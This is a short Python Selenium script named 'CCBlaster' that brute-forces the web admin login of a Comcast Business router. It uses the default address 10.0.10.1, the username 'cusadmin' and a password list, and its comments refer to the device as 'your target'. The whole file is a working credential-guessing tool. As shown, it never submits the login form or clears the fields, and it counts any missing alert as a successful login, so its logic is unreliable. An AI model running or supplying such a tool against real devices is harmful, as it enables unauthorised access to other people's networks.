#Uses Python 3
#Requires Selenium and the Chrome webdriver

#CCBlaster - A utility to use a password file to try and guess the password of a Comcast Business Class web interface
#The utility uses comcast's default LAN address of 10.0.10.1 and username of cusadmin

#Future revisions may make this easier to choose but for now if you need different values just edit the code


import time
from selenium import webdriver
from selenium.webdriver.support.ui import Select


driver = webdriver.Chrome()
#Change this variable as needed to reflect the address of the comcast web interface of your target
driver.get("http://10.0.10.1")

#open the passwords file  - change to your password file or rename your file to passwords.txt and run the utility in the same directory as the password file
pwf = open('passwords.txt', 'r')

#username - default is cusadmin - you can change this to whatever you need 
user = 'cusadmin'

pwf_list = pwf.readlines()
pwf.close()

 
for i in pwf_list:
    if len(i) < 4: continue #skip i if it will cause an error because fo too few characters
    #try each password in the password file
    driver.find_element_by_xpath("//input[@id='username']").send_keys(user)
    driver.find_element_by_xpath("//input[@id='password']").send_keys(i)
    time.sleep(2)  #slight pause 
    try:
        #a bad password will pop up an error message - this will click through the error and go on to the next try
        alert = driver.switch_to_alert()
        alert.dismiss()
    except:
        #if no pop up then login ok - you got the password
        print('The password is ' + i )
        break

driver.quit()




#http://10.0.10.1/at_a_glance.php is the page on a successful login
